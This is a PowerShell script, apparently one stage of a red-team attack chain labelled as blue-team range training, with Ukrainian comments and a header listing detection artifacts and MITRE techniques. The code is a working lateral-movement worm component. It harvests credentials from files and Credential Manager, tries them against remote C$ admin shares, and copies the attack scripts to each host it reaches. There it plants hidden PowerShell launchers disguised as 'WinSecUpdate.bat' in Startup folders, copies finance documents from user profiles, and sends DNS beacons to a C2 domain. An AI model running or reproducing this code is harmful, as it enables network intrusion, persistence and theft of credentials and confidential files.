# =============================================================================
# Block 6: Lateral Movement via SMB
# для навчання — заборонено використовувати поза навчальним середовищем
# EXERCISE ONLY — CyberRanges blue team training
# =============================================================================
# Що робить:
#   1. Читає живі SMB-хости з hosts.txt (block3)
#   2. Збирає credentials: з creds\ (block2) + збережені Windows credentials
#   3. Для кожного хоста перебирає credentials → підключається через SMB
#   4. Копіює block1_persist.ps1 у All-Users Startup папку цільової машини
#      → при наступному логоні будь-якого юзера скрипт автоматично запускається
#
# Куди копіює:
#   \\TARGET\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
#
# Артефакти для blue team:
#   - Sysmon EID 3  : SMB з'єднання WS-1 → WS-X (TCP/445)
#   - Sysmon EID 11 : новий файл у Startup папці на TARGET
#   - Wazuh EID 4624: мережевий вхід (Logon Type 3) на TARGET
#   - Wazuh EID 4648: explicit credentials (чужі credentials)
#   - Wazuh EID 5145: мережевий доступ до файлового шару (C$)
#
# MITRE ATT&CK:
#   T1021.002 — Remote Services: SMB/Windows Admin Shares
#   T1547.001 — Boot or Logon Autostart: Registry Run Keys / Startup Folder
#   T1078     — Valid Accounts
# =============================================================================

$BLOCK_TAG = "B6"
$LogPath   = "C:\ProgramData\upd_logs\block6.log"
. "$PSScriptRoot\config.ps1"

# ── C2 guard ─────────────────────────────────────────────────────────────────
$script:C2_AVAILABLE = $false  # перевіряємо один раз нижче

# ── Читати SMB-хости з hosts.txt ──────────────────────────────────────────────

function Get-SmbHosts {
    $hosts_file = "C:\ProgramData\upd_logs\hosts.txt"
    if (-not (Test-Path $hosts_file)) {
        Write-Log "hosts.txt не знайдено — запусти block3 спочатку" -Level "ERROR"
        return @()
    }

    $smb_hosts = @()
    Get-Content $hosts_file | ForEach-Object {
        # Формат: "192.168.x.x | hostname | SMB:YES | RDP:YES"
        if ($_ -match '^(\d+\.\d+\.\d+\.\d+).*SMB:YES') {
            $ip = $Matches[1]
            # Пропускаємо себе
            $my_ips = (Get-NetIPAddress -AddressFamily IPv4).IPAddress
            if ($ip -notin $my_ips) {
                $smb_hosts += $ip
                Write-Log "SMB target found: $ip"
            }
        }
    }
    return $smb_hosts
}

# ── Зібрати credentials з різних джерел ──────────────────────────────────────

function Get-CollectedCredentials {
    $creds = [System.Collections.Generic.List[PSCustomObject]]::new()

    # ── Джерело 1: файли у creds\ (зібрані block2) ───────────────────────────
    $creds_dir = "C:\ProgramData\upd_logs\creds"
    if (Test-Path $creds_dir) {
        Write-Log "Parsing credential files from $creds_dir"
        Get-ChildItem $creds_dir -Include "*.txt","*.csv" -Recurse | ForEach-Object {
            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
            if (-not $content) { return }

            # CSV формат: Username,Password або Username,Password,System (перший рядок — заголовок)
            if ($_.Extension -eq ".csv") {
                $lines = Get-Content $_.FullName -ErrorAction SilentlyContinue
                foreach ($line in $lines) {
                    $parts = $line.Split(',')
                    if ($parts.Count -ge 2) {
                        $u  = $parts[0].Trim()
                        $pw = $parts[1].Trim()
                        # пропускаємо заголовок
                        if ($u -ieq "username" -or $u -ieq "user") { continue }
                        if ($u -and $pw -and $pw.Length -ge 4) {
                            $creds.Add([PSCustomObject]@{ Username=$u; Password=$pw; Source=$_.FullName })
                            Write-Log "Cred from CSV: $u (source: $($_.Name))"
                        }
                    }
                }
                return
            }

            # Інші формати: username:password або user=xxx password=xxx
            $patterns = @(
                '([a-zA-Z0-9._]+):([^\s\r\n]{4,})',
                'user(?:name)?\s*[=:]\s*([^\s\r\n]+)\s+pass(?:word)?\s*[=:]\s*([^\s\r\n]+)',
                '([a-z]\.[a-z]+)\s+([A-Z][a-zA-Z0-9!@#$%^&*]+)'
            )
            foreach ($p in $patterns) {
                $content | Select-String -Pattern $p -AllMatches | ForEach-Object {
                    $_.Matches | ForEach-Object {
                        $u = $_.Groups[1].Value
                        $pw = $_.Groups[2].Value
                        if ($u -and $pw -and $u -ne $pw) {
                            $creds.Add([PSCustomObject]@{ Username=$u; Password=$pw; Source=$_.FullName })
                            Write-Log "Cred from file: $u / [hidden] (source: $($_.Name))"
                        }
                    }
                }
            }
        }
    }

    # ── Джерело 2: збережені Windows Credential Manager credentials ───────────
    Write-Log "Checking Windows Credential Manager..."
    $cmdkey_output = cmdkey /list 2>&1
    $current_target = $null
    foreach ($line in $cmdkey_output) {
        if ($line -match 'Target:\s*(.+)') {
            $current_target = $Matches[1].Trim()
        }
        if ($line -match 'User:\s*(.+)') {
            $user = $Matches[1].Trim()
            if ($current_target -and $user) {
                # Credential Manager зберігає username але не пароль у відкритому вигляді
                # Логуємо як знахідку для подальшого використання
                Write-Log "Stored credential found: target=$current_target user=$user"
                $creds.Add([PSCustomObject]@{ Username=$user; Password=$null; Source="CredentialManager:$current_target" })
            }
        }
    }

    return $creds
}

# ── Перевірити чи credentials валідні для хоста ───────────────────────────────

function Test-SmbCredential {
    param([string]$TargetIP, [string]$Username, [string]$Password)

    $share = "\\$TargetIP\C$"

    # Спочатку від'єднуємось якщо є попереднє з'єднання
    net use $share /delete 2>$null | Out-Null

    if ($Password) {
        # Пробуємо 3 формати: домен, локальний, без префікса
        $Domain  = if ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } else { $env:USERDOMAIN }
        $formats = @("$Domain\$Username", "$TargetIP\$Username", $Username)
        foreach ($fmt in $formats) {
            net use $share /delete 2>$null | Out-Null
            Write-Log "  TRY: net use $share /user:$fmt ***"
            Write-Host "  [B6] TRY: $share  user=$fmt" -ForegroundColor DarkYellow
            $result = net use $share /user:$fmt $Password 2>&1
            $msg = ($result -join " ").Trim()
            if ($LASTEXITCODE -eq 0 -or $msg -match "command completed successfully") {
                Write-Log "  AUTH OK: $share /user:$fmt"
                Write-Host "  [B6] AUTH OK: $share /user:$fmt" -ForegroundColor Green
                return $true
            } else {
                Write-Log "  AUTH FAIL: $fmt → $msg"
                Write-Host "  [B6] FAIL: $fmt → $msg" -ForegroundColor DarkGray
            }
        }
    } else {
        Write-Log "  TRY: net use $share (current token)"
        Write-Host "  [B6] TRY: $share (current token)" -ForegroundColor DarkYellow
        $result = net use $share 2>&1
        $msg = ($result -join " ").Trim()
        if ($LASTEXITCODE -eq 0 -or $msg -match "command completed successfully") {
            Write-Log "  AUTH OK: $share (current token)"
            Write-Host "  [B6] AUTH OK: $share (current token)" -ForegroundColor Green
            return $true
        } else {
            Write-Log "  AUTH FAIL: current token → $msg"
        }
    }

    Write-Log "SMB AUTH FAIL: $TargetIP with $Username"
    return $false
}

# ── Скопіювати скрипти у Startup папку цільового хоста ───────────────────────

function Install-StartupPayload {
    param([string]$TargetIP)

    # Перевірка wsu.lock — якщо є, машина вже заражена → пропустити
    $lock_path = "\\$TargetIP\C$\Windows\Temp\wsu.lock"
    if (Test-Path $lock_path) {
        Write-Log "Target $TargetIP вже заражена (wsu.lock) — пропускаємо" -Level "WARN"
        return "already_infected"
    }

    # Скрипти → C:\Windows\Temp (існуюча папка, не потребує створення)
    $target_dir = "\\$TargetIP\C$\Windows\Temp"
    if (-not (Test-Path $target_dir)) {
        Write-Log "Temp path not accessible: $target_dir" -Level "WARN"
        return $false
    }

    $SCRIPT_DIR  = Split-Path $MyInvocation.MyCommand.Path
    $PERSIST_DIR = "$env:APPDATA\Microsoft\WinUpd"
    $source_dir  = if (Test-Path "$PERSIST_DIR\block1_persist.ps1") { $PERSIST_DIR } else { $SCRIPT_DIR }

    $scripts = @(
        "config.ps1",
        "block1_persist.ps1",
        "block2_discovery.ps1",
        "block3_scan.ps1",
        "block4_staging.ps1",
        "block5_exfil.ps1",
        "block6_lateral.ps1",
        "block7_fileserver.ps1"
    )

    $copied = 0
    foreach ($script in $scripts) {
        $src = Join-Path $source_dir $script
        if (Test-Path $src) {
            Copy-Item -Path $src -Destination $target_dir -Force -ErrorAction SilentlyContinue
            if (Test-Path (Join-Path $target_dir $script)) { $copied++ }
        }
    }
    Write-Log "Copied $copied scripts → $target_dir"

    # .bat launcher — запускає block1 з C:\Windows\Temp
    $target_b1  = "C:\Windows\Temp\block1_persist.ps1"
    $bat_content = "@echo off`r`npowershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"$target_b1`""

    $placed = 0

    # Метод 1: All-Users Startup
    $all_startup = "\\$TargetIP\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    if (Test-Path $all_startup) {
        $bat_content | Out-File -FilePath "$all_startup\WinSecUpdate.bat" -Encoding ASCII -Force
        Write-Log "Startup [all-users]: $all_startup\WinSecUpdate.bat"
        $placed++
    }

    # Метод 2: Per-user Startup для кожного профілю (надійніше якщо GPO блокує All-Users)
    $profiles = Get-ChildItem "\\$TargetIP\C$\Users" -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') }

    foreach ($profile in $profiles) {
        $user_startup = "\\$TargetIP\C$\Users\$($profile.Name)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        if (Test-Path $user_startup) {
            $bat_content | Out-File -FilePath "$user_startup\WinSecUpdate.bat" -Encoding ASCII -Force
            Write-Log "Startup [per-user:$($profile.Name)]: $user_startup\WinSecUpdate.bat"
            $placed++
        }
    }

    # Створюємо wsu.lock на цілі — щоб інші WS не перезаражали її
    "$env:COMPUTERNAME → $TargetIP | $(Get-Date)" |
        Out-File -FilePath $lock_path -Encoding UTF8 -Force
    Write-Log "wsu.lock created on $TargetIP"

    Write-Log "Installed $copied scripts, $placed startup entries on $TargetIP"
    return ($copied -gt 0 -and $placed -gt 0)
}

# ── Зібрати документи з віддаленої WS після SMB підключення (A07) ────────────

function Collect-RemoteDocs {
    param([string]$TargetIP)

    $docs_dir = "C:\ProgramData\upd_logs\docs"
    if (-not (Test-Path $docs_dir)) {
        New-Item -Path $docs_dir -ItemType Directory -Force | Out-Null
    }

    $doc_keywords   = @("budget","finance","payment","invoice","salary","contract","approval","report","financial","statement")
    $doc_extensions = @("*.docx","*.xlsx","*.pdf")
    $base_path      = "\\$TargetIP\C$\Users"

    if (-not (Test-Path $base_path)) {
        Write-Log "Remote Users share not accessible: $base_path" -Level "WARN"
        return 0
    }

    $collected = 0
    foreach ($ext in $doc_extensions) {
        Get-ChildItem -Path $base_path -Filter $ext -Recurse -ErrorAction Ignore | ForEach-Object {
            $name_lower = $_.Name.ToLower()
            if ($doc_keywords | Where-Object { $name_lower -like "*$_*" }) {
                Copy-Item -Path $_.FullName -Destination $docs_dir -Force -ErrorAction Ignore
                $collected++
                Write-Log "Doc collected [WS $TargetIP]: $($_.FullName)"
            }
        }
    }

    Write-Log "Documents collected from ${TargetIP}: $collected"
    Invoke-DnsBeacon -Label "B6:DOCS:${TargetIP}:$collected"
    return $collected
}

# ── Очистити SMB з'єднання ────────────────────────────────────────────────────

function Disconnect-Smb {
    param([string]$TargetIP)
    net use "\\$TargetIP\C$" /delete /yes 2>$null | Out-Null
    Write-Log "Disconnected SMB: $TargetIP"
}

# =============================================================================
# MAIN
# =============================================================================

Write-Log "=== BLOCK 6: LATERAL MOVEMENT START ==="

# ── Перевірка C2 один раз — якщо недоступний, beacons вимкнено ───────────────
$script:C2_AVAILABLE = $null -ne (Resolve-DnsName "ping.$C2_DOMAIN" -Type A -ErrorAction SilentlyContinue)
if ($script:C2_AVAILABLE) {
    Write-Log "C2 доступний ($C2_DOMAIN) — beacons увімкнено"
} else {
    Write-Log "C2 недоступний ($C2_DOMAIN) — beacons вимкнено, SMB продовжується"
}

Invoke-DnsBeacon -Label "B6:START:$env:COMPUTERNAME"

# ── wsu.lock — маркер зараження ──────────────────────────────────────────────
# Кожна заражена машина має C:\Windows\Temp\wsu.lock (створюється block1).
# Block6 перевіряє цей маркер на ЦІЛІ перед копіюванням.
# Якщо маркер є → вже заражена → пропускаємо.
# Якщо немає → нова машина → копіюємо + створюємо маркер.
# Це дозволяє будь-якій WS машині поширюватись далі (на WS-5 якщо був offline)
# але не заражати одне одного по колу.

# ── Крок 1: Отримати список SMB цілей ────────────────────────────────────────

$smb_targets = Get-SmbHosts
if ($smb_targets.Count -eq 0) {
    Write-Log "Немає SMB цілей — запусти block3 спочатку" -Level "ERROR"
    Invoke-DnsBeacon -Label "B6:ERROR:NO_TARGETS"
    exit
}
Write-Log "SMB targets: $($smb_targets -join ', ')"
Invoke-DnsBeacon -Label "B6:TARGETS:$($smb_targets.Count)"

# ── Крок 2: Зібрати credentials ──────────────────────────────────────────────

$all_creds = Get-CollectedCredentials
Write-Log "Total credentials collected: $($all_creds.Count)"
Write-Host "`n[B6] Credentials зібрані ($($all_creds.Count)):" -ForegroundColor Cyan
$all_creds | ForEach-Object {
    $pw_hint = if ($_.Password) { $_.Password.Substring(0, [Math]::Min(3,$_.Password.Length)) + "***" } else { "(no password)" }
    Write-Host "     $($_.Username) / $pw_hint  ← $($_.Source)" -ForegroundColor DarkCyan
    Write-Log "  CRED: $($_.Username) / $pw_hint  source=$($_.Source)"
}
Invoke-DnsBeacon -Label "B6:CREDS:$($all_creds.Count)"

# ── Крок 3: Спробувати кожен хост з кожним credential ────────────────────────

$compromised = @()

foreach ($target in $smb_targets) {
    Write-Log "--- Attempting target: $target ---"
    Invoke-DnsBeacon -Label "B6:TRY:$target"

    $success = $false

    # Перебір зібраних credentials (тільки ті що мають пароль)
    foreach ($cred in $all_creds | Where-Object { $_.Password }) {
        if (Test-SmbCredential -TargetIP $target -Username $cred.Username -Password $cred.Password) {
            Write-Log "Valid credential for $target : $($cred.Username) (from $($cred.Source))"
            Invoke-DnsBeacon -Label "B6:AUTH:OK:$target"
            $success = $true
            break
        }
    }

    if (-not $success) {
        Write-Log "All credentials failed for $target" -Level "WARN"
        Invoke-DnsBeacon -Label "B6:AUTH:FAIL:$target"
        continue
    }

    # ── Встановити payload у Startup ─────────────────────────────────────────
    $installed = Install-StartupPayload -TargetIP $target

    if ($installed) {
        $compromised += $target
        Write-Log "TARGET COMPROMISED: $target — payload in Startup folder"
        Invoke-DnsBeacon -Label "B6:PWNED:$target"
    }

    # ── Збір документів з WS-2 (A07) ─────────────────────────────────────────
    Collect-RemoteDocs -TargetIP $target | Out-Null

    Disconnect-Smb -TargetIP $target
}

# ── Підсумок ──────────────────────────────────────────────────────────────────

Write-Log "=== BLOCK 6: COMPLETE ==="
Write-Log "Targets attempted: $($smb_targets.Count)"
Write-Log "Compromised:       $($compromised.Count) ($($compromised -join ', '))"

# Зберегти список скомпрометованих хостів
if ($compromised.Count -gt 0) {
    $compromised | Out-File "C:\ProgramData\upd_logs\compromised.txt" -Encoding UTF8
}

Invoke-DnsBeacon -Label "B6:DONE:PWNED:$($compromised.Count)"
